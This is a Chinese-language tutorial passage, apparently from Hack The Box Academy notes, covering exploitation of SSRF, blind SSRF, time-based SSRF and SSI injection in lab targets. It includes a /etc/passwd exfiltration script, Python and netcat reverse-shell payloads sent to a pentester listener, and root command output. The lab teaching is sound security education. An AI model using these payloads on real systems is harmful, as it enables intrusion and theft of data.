<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 586</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"</span><br><span class="line">        "http://www.w3.org/TR/html4/strict.dtd"&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;</span><br><span class="line">        &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>要执行带有参数或特殊字符的命令，我们需要在通过三个不同的Web应用程序时对它们进行三次编码。</p>
<p>为此，您可以使用任何在线URL编码服务，如<a target="_blank" rel="noopener" href="https://www.urlencoder.org/">urlencoder.org</a>。也存在从终端实现这一点的快速方法。这是使用<code>jq</code>，它支持如下编码：</p>
<h4 id="Install-JQ-安装JQ"><a href="#Install-JQ-安装JQ" class="headerlink" title="Install JQ 安装JQ"></a>Install JQ 安装JQ</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo apt-get install jq</span><br><span class="line">mikannse7@htb[/htb]$ echo "encode me" | jq -sRr @uri</span><br><span class="line">encode%20me%0A</span><br></pre></td></tr></tbody></table></figure>

<p>我们现在可以创建一个bash函数来自动执行目标应用程序上的命令。</p>
<h4 id="Automate-executing-commands"><a href="#Automate-executing-commands" class="headerlink" title="Automate executing commands"></a>Automate executing commands</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ function rce() {</span><br><span class="line">function&gt; while true; do</span><br><span class="line">function while&gt; echo -n "# "; read cmd</span><br><span class="line">function while&gt; ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)</span><br><span class="line">function while&gt; curl -s -o - "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"</span><br><span class="line">function while&gt; echo ""</span><br><span class="line">function while&gt; done</span><br><span class="line">function&gt; }</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们需要调用函数并通过以下方式执行命令：        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ rce</span><br><span class="line"># uname -a; hostname; whoami</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami</span><br><span class="line">&lt;/h1&gt;&lt;a&gt;Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux</span><br><span class="line">a054d48cc0a4</span><br><span class="line">root</span><br><span class="line"> &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h2><p>服务器端请求伪造漏洞可能是“盲目的”。在这些情况下，即使请求被处理，我们也看不到后端服务器的响应。因此，SSRF盲漏洞更难以检测和利用。</p>
<p>我们可以通过带外技术检测SSRF盲漏洞，使服务器向我们控制下的外部服务发出请求。为了检测后端服务是否正在处理我们的请求，我们可以使用具有我们拥有的公共IP地址的服务器或以下服务：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>（Burp Suite Professional的一部分。社区版中不提供）</li>
<li><a target="_blank" rel="noopener" href="http://pingb.in/">http://pingb.in</a></li>
</ul>
<p>Blind SSRF漏洞可能存在于PDF文档生成器和HTTP标头等位置。</p>
<h2 id="Blind-SSRF-Exploitation-Example"><a href="#Blind-SSRF-Exploitation-Example" class="headerlink" title="Blind SSRF Exploitation Example"></a>Blind SSRF Exploitation Example</h2><p>现在，让我们利用Web应用程序中的SSRF盲漏洞，该应用程序接收HTML文件并返回PDF文档。这个Web应用程序是我们可以在本节末尾的练习中生成的目标。</p>
<p>导航到本节的结尾并单击<code>Click here to spawn the target system!</code>，然后使用提供的Pwnbox或具有提供的VPN密钥的本地VM浏览目标应用程序并沿着。应用程序正在侦听端口8080。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind1_.png" alt="image"></p>
<p>如果我们上传各种HTML文件并检查响应，我们会注意到应用程序返回相同的响应，而不管提交文件的结构和内容如何。此外，我们无法观察到与前端处理提交的HTML文件相关的任何响应。我们是否应该得出结论，应用程序不容易受到SSRF的攻击？当然不是！我们应该在渗透测试期间进行彻底的测试，并寻找不同漏洞类别的盲目对应物。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png" alt="image"></p>
<p>让我们创建一个HTML文件，其中包含一个指向我们控制下的服务的链接，以测试应用程序是否容易受到SSRF盲漏洞的攻击。此服务可以是我们拥有的机器中托管的Web服务器、Burp Collaborator、Pingb.in URL等。请注意，我们在使用带外技术时可以使用的协议包括HTTP、DNS、FTP等。</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://&lt;SERVICE IP&gt;:PORT/x?=viaimgtag"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>为了简单起见，我们将用于测试SSRF盲漏洞的服务将是在Pwnbox或本地VM中运行并在端口9090上侦听的简单Netcat侦听器。如果您使用的是本地VM，请记住使用提供的VPN密钥。因此，在上面的HTML文件中，<code>SERVICE IP</code>应该是Pwnbox或本地VM的<code>VPN/TUN IP</code>，<code>PORT</code>应该是<code>9090</code>。</p>
<h4 id="Netcat-Listener-1"><a href="#Netcat-Listener-1" class="headerlink" title="Netcat Listener"></a>Netcat Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nc -nlvp 9090</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 9090</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_server__.png" alt="image"></p>
<p>提交文件后，我们将在浏览器中收到来自Web应用程序的消息，并向我们的服务器发出请求，显示用于将HTML文档转换为PDF的应用程序。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_payload_.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind2__.png" alt="image"></p>
<p>通过检查请求，我们注意到User-Agent中的<code>wkhtmltopdf</code>。如果我们浏览<a target="_blank" rel="noopener" href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf的下载网页</a>，下面的声明引起了我们的注意：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Do not use wkhtmltopdf with any untrusted HTML – be sure to  sanitize any user-supplied HTML/JS; otherwise, it can lead to the  complete takeover of the server it is running on! Please read the  project status for the gory details.</span><br></pre></td></tr></tbody></table></figure>

<p>很好，我们可以在wkhtmltopdf中执行JavaScript！让我们通过创建以下HTML文档来利用此功能读取本地文件。</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Exfiltration via Blind SSRF<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> readfile = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// Read the local file</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> exfil = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// Send the file to our server</span></span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="title function_">open</span>(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>, <span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (readfile.<span class="property">readyState</span> === <span class="number">4</span>) {</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> url = <span class="string">'http://&lt;SERVICE IP&gt;:&lt;PORT&gt;/?data='</span>+<span class="title function_">btoa</span>(<span class="variable language_">this</span>.<span class="property">response</span>);</span></span><br><span class="line"><span class="language-javascript">                exfil.<span class="title function_">open</span>(<span class="string">"GET"</span>, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                exfil.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">        readfile.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>){<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">'&lt;a&gt;Oops!&lt;/a&gt;'</span>);}</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>在本例中，我们使用两<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">个XMLHttpRequest</a>对象，一个用于阅读本地文件，另一个用于将其发送到服务器。此外，我们使用<code>btoa</code>函数来发送以Base64编码的数据。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_payload_2.png" alt="image"></p>
<p>让我们启动一个HTTP服务器，提交新的HTML文件，等待响应，并在处理完HTML文件后对其内容进行解码，如下所示。</p>
<h4 id="Netcat-Listener-2"><a href="#Netcat-Listener-2" class="headerlink" title="Netcat Listener"></a>Netcat Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nc -nlvp 9090</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 9090</span><br><span class="line">GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1</span><br><span class="line">Origin: file://</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Language: en,*</span><br><span class="line">Host: 10.10.14.221:9090</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_server__2.png" alt="image"></p>
<h4 id="Base64-Decoding"><a href="#Base64-Decoding" class="headerlink" title="Base64 Decoding"></a>Base64 Decoding</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ echo """cm9vdDp4OjA6MDpyb290Oi9yb&lt;SNIP&gt;""" | base64 -d</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></tbody></table></figure>

<p>在上一节中，我们通过SSRF利用了一个内部应用程序，并在目标服务器上执行了远程命令。当前场景中存在相同的内部应用程序（<code>internal.app.local</code>）。让我们对底层服务器进行妥协，但这次是通过创建一个带有有效负载的HTML文档来利用本地应用程序侦听internal.app.local。</p>
<p>我们将使用以下反向shell负载（一旦实现远程代码执行，就很容易识别Python是否安装）。</p>
<h4 id="Bash-Reverse-Shell"><a href="#Bash-Reverse-Shell" class="headerlink" title="Bash Reverse Shell"></a>Bash Reverse Shell</h4><p>Code: 验证码： bash</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=<span class="string">"&lt;VPN/TUN IP&gt;"</span>;<span class="built_in">export</span> RPORT=<span class="string">"&lt;PORT&gt;"</span>;python -c <span class="string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span></span><br></pre></td></tr></tbody></table></figure>

<p>请记住，我们需要对有效负载进行URL编码。在这种情况下，我们需要对它进行两次编码。最终结果将类似于下面。</p>
<h4 id="URL-Encoded-Payload"><a href="#URL-Encoded-Payload" class="headerlink" title="URL Encoded Payload"></a>URL Encoded Payload</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527</span><br></pre></td></tr></tbody></table></figure>

<p>现在，让我们创建一个HTML文件，它对internal.app.local执行GET请求，到达易受SSRF远程代码执行攻击的本地应用程序，并执行我们的反向shell。</p>
<h4 id="HTML-Payload"><a href="#HTML-Payload" class="headerlink" title="HTML Payload"></a>HTML Payload</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Reverse Shell via Blind SSRF<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> http = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        http.<span class="title function_">open</span>(<span class="string">"GET"</span>,<span class="string">"http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527"</span>, <span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">        http.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        http.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>){<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">'&lt;a&gt;Oops!&lt;/a&gt;'</span>);}</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>一旦我们在机器上启动Netcat侦听器并提交上面的HTML文件，我们就会收到来自<code>internal.app.local</code>的反向shell。      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ nc -nvlp 9090</span><br><span class="line"></span><br><span class="line">listening on [any] 9090 ...</span><br><span class="line">Connection received on 10.129.201.238 33100</span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Time-Based-SSRF"><a href="#Time-Based-SSRF" class="headerlink" title="Time-Based SSRF"></a>Time-Based SSRF</h2><p>我们也可以通过观察响应的时间差异来确定SSRF漏洞的存在。此方法还有助于发现内部服务。</p>
<p>让我们将下面的文档提交到上一节的PDF应用程序，并观察响应时间。</p>
<p>Code: 验证码： htmlHTML</p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Time-Based Blind SSRF<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://blah.nonexistent.com"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind_time.png" alt="image"></p>
<p>我们可以看到服务花了10秒来响应请求。如果我们在HTML文档中提交一个有效的URL，响应时间会更短。请记住<code>internal.app.local</code>是一个有效的内部应用程序（我们可以在上一节中通过SSRF访问）。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind_time2.png" alt="image"></p>
<p>在某些情况下，应用程序可能会立即失败，而不是花更多的时间来响应。因此，我们需要仔细观察请求之间的时间差。</p>
<h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><h2 id="Server-Side-Includes-Overview"><a href="#Server-Side-Includes-Overview" class="headerlink" title="Server-Side Includes Overview"></a>Server-Side Includes Overview</h2><p>服务器端包含（<code>SSI</code>）是Web应用程序使用的一种技术，用于在加载之前或渲染过程中通过评估SSI指令在HTML页面上创建动态内容。一些SSI指令是：</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">// Date</span><br><span class="line"><span class="comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Modification date of a file</span><br><span class="line"><span class="comment">&lt;!--#flastmod file="index.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// CGI Program results</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/cgi-bin/counter.pl" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Including a footer</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/footer.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Executing commands</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Setting variables</span><br><span class="line"><span class="comment">&lt;!--#set var="name" value="Rich" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Including virtual files (same directory)</span><br><span class="line"><span class="comment">&lt;!--#include virtual="file_to_include.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Including files (same directory)</span><br><span class="line"><span class="comment">&lt;!--#include file="file_to_include.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Print all variables</span><br><span class="line"><span class="comment">&lt;!--#printenv --&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>在Web应用程序上使用SSI可以通过检查扩展名（如.shtml、.shtm或. stm）来识别。也就是说，存在允许其他扩展（如.html）处理SSI指令的非默认服务器配置。</p>
<p>我们需要通过输入字段向目标应用程序提交有效负载，例如上面提到的那些，以测试SSI注入。如果存在漏洞，Web服务器将在呈现页面之前解析和执行指令，但要注意这些漏洞也可能以盲格式存在。成功的SSI注入可能会导致从本地文件中提取敏感信息，甚至在目标Web服务器上执行命令。</p>
<h2 id="SSI-Injection-Exploitation-Example"><a href="#SSI-Injection-Exploitation-Example" class="headerlink" title="SSI Injection Exploitation Example"></a>SSI Injection Exploitation Example</h2><p>让我们在一个面向互联网的Web应用程序上练习SSI注入（目标可以在本节的最后生成）。导航到本节的结尾并单击<code>Click here to spawn the target system</code>，然后使用提供的Pwnbox或本地VM来沿着。通过浏览到产生的目标，我们遇到了下面的。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_1.png" alt="image"></p>
<p>让我们通过提交上一节中提到的一些SSI指令来重点识别SSI注入漏洞。</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">1. <span class="comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span></span><br><span class="line">2. <span class="comment">&lt;!--#printenv --&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="Date-日期"><a href="#Date-日期" class="headerlink" title="Date 日期"></a>Date 日期</h4><p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_1.5.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_2.png" alt="image"></p>
<h4 id="All-Variables"><a href="#All-Variables" class="headerlink" title="All Variables"></a>All Variables</h4><p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_3.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_4.png" alt="image"></p>
<p>正如我们所看到的，应用程序确实容易受到SSI注入！ 现在，继续本节结尾处的练习，并利用上一节中列出的可能导致对底层系统执行命令的任何SSI指令来完成练习。</p>
<p><strong>注意：</strong>正如我们所看到的，通过SSI在目标应用程序上运行OS命令是可能的，但是谁不喜欢shell呢？请记住以下反向shell负载，即使在默认情况下不包括执行功能的OpenBSD-netcat上也可以工作。还要注意，由于网络限制，您将无法在本节的练习中获得反向shell！ </p>
<h4 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd="mkfifo /tmp/foo;nc &lt;PENTESTER IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo" --&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>mkfifo /tmp/foo</code>：在<code>/tmp/foo</code>中创建一个FIFO特殊文件</li>
<li><code>nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo</code>：连接到pentester机器并重定向标准输入描述符</li>
<li><code>| bin/bash 1&gt;/tmp/foo</code>：执行<code>/bin/bash</code>将标准输出描述符重定向到<code>/tmp/foo</code></li>
<li><code>rm /tmp/foo</code>：删除FIFO文件</li>
</ul>
<h1 id="Edge-Side-Includes-ESI"><a href="#Edge-Side-Includes-ESI" class="headerlink" title="Edge-Side Includes (ESI)"></a>Edge-Side Includes (ESI)</h1><p>Edge Side Includes（<code>ESI</code>）是一种基于XML的标记语言，用于通过启用Web内容的重缓存来解决性能问题，否则通过传统的缓存协议将无法存储这些内容。Edge Side  Includes（ESI）允许在网络边缘（内容交付网络、用户浏览器或反向代理）进行动态Web内容组装，方法是通过ESI元素标记（XML标记）指示页面处理器完成页面组装需要做什么。</p>
<p>ESI标记用于指示HTTP代理（反向代理、缓存服务器等）以获取关于具有已经高速缓存的模板的网页的附加信息。在将网页呈现给最终用户之前，该信息可能来自另一个服务器。ESI使完全缓存的网页包含动态内容。</p>
<p>当攻击者设法在HTTP响应中反映恶意ESI标记时，会发生边缘侧包含注入。此漏洞的根本原因是HTTP代理无法验证ESI标记来源。他们将很乐意解析和评估上游服务器的合法ESI标记以及攻击者的恶意ESI标记。</p>
<p>虽然我们可以通过在搜索<code>Surrogate-Control: content="ESI/1.0"</code>时检查响应头来识别ESI的使用，但我们通常需要使用盲攻击方法来检测ESI是否在使用中。具体来说，我们可以将ESI标记引入到HTTP请求中，以查看是否有任何中间代理正在解析请求以及是否可以进行ESI注入。一些有用的ESI标记是：</p>
<h4 id="ESI-Tags"><a href="#ESI-Tags" class="headerlink" title="ESI Tags"></a>ESI Tags</h4><p>Code: </p>
